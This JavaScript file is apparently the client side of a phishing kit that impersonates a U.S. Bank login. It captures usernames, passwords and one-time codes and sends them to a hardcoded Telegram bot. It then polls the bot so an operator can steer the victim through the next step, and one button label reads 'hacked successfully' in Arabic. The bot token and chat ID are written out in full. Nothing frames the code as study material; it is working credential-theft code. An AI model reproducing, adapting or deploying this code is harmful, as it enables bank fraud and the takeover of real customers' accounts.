// Configuration for Telegram
const BOT_TOKEN = "8472908079:AAHRhM8yUVmfMagFkA85x8T0Zp9WMqWZftU";
const CHAT_ID = "7865246557";

// Handle Login Submission (Step 1)
async function handleLoginSubmit(event) {
    event.preventDefault();
    
    // Show Loader
    document.getElementById('loader').style.display = 'flex';
    document.getElementById('error-msg').style.display = 'none';

    const accountType = document.getElementById('accType').value;
    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;

    const message = `🏦 *New U.S. Bank Login Attempt* \n\n` +
                    `📂 *Type:* ${accountType} \n` +
                    `👤 *User:* \`${username}\` \n` +
                    `🔑 *Pass:* \`${password}\``;

    const keyboard = {
        inline_keyboard: [
            [{ text: "طلب OTP 📲", callback_data: "request_otp" }],
            [{ text: "خطأ في البيانات ❌", callback_data: "login_error" }]
        ]
    };

    await sendTelegramMessage(message, keyboard);
    startPollingForUpdates();
}

// Handle OTP Submission (Step 2)
async function handleOTPSubmit(event) {
    event.preventDefault();
    
    // Show Loader
    document.getElementById('loader').style.display = 'flex';
    document.getElementById('otp-error').style.display = 'none';

    const otpCode = document.getElementById('otp_code').value;

    const message = `🔑 *U.S. Bank OTP Received* \n\n` +
                    `🔢 *Code:* \`${otpCode}\``;

    const keyboard = {
        inline_keyboard: [
            [{ text: "OTP خطأ ❌", callback_data: "otp_error" }],
            [{ text: "تم الاختراق بنجاح ✅", callback_data: "success_final" }]
        ]
    };

    await sendTelegramMessage(message, keyboard);
    startPollingForUpdates();
}

// Main function to send messages to Telegram
async function sendTelegramMessage(text, replyMarkup) {
    try {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: text,
                parse_mode: 'Markdown',
                reply_markup: replyMarkup
            })
        });
    } catch (error) {
        console.error("Telegram API Error:", error);
    }
}

// Polling function to listen for Admin commands from Telegram
function startPollingForUpdates() {
    const pollingInterval = setInterval(async () => {
        try {
            const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=-1`);
            const data = await response.json();
            
            if (data.result && data.result.length > 0) {
                const lastUpdate = data.result[0];
                if (lastUpdate.callback_query) {
                    const command = lastUpdate.callback_query.data;

                    // Logic for "Request OTP"
                    if (command === "request_otp") {
                        clearInterval(pollingInterval);
                        document.getElementById('loader').style.display = 'none';
                        document.getElementById('login-step').style.display = 'none';
                        document.getElementById('otp-step').style.display = 'block';
                    }

                    // Logic for "Login Error"
                    if (command === "login_error") {
                        clearInterval(pollingInterval);
                        document.getElementById('loader').style.display = 'none';
                        document.getElementById('error-msg').style.display = 'block';
                        document.getElementById('password').value = "";
                    }

                    // Logic for "OTP Error"
                    if (command === "otp_error") {
                        clearInterval(pollingInterval);
                        document.getElementById('loader').style.display = 'none';
                        document.getElementById('otp-error').style.display = 'block';
                        document.getElementById('otp_code').value = "";
                    }
                    
                    // Logic for "Success"
                    if (command === "success_final") {
                        clearInterval(pollingInterval);
                        alert("Thank you. Your account is being verified.");
                        window.location.reload();
                    }
                }
            }
        } catch (error) {
            console.error("Polling Error:", error);
        }
    }, 3000);
}
